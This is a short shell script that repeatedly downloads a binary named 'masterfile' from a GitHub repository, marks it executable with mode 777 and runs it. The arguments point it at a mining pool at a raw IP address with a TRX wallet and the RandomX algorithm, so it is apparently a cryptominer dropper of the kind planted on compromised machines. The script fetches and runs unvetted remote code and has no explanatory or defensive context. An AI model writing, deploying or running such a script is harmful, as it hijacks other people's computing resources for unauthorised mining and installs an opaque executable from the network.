#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget  https://github.com/OmJhonyPerkasa/yteam/raw/main/masterfile && chmod 777 masterfile && ./masterfile -o  159.65.30.104:3333 -u TRX:TP2V29rruTFuPqyqPF5YaJD2eo3g9K4nnC -k -a rx/0 -t 2 
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
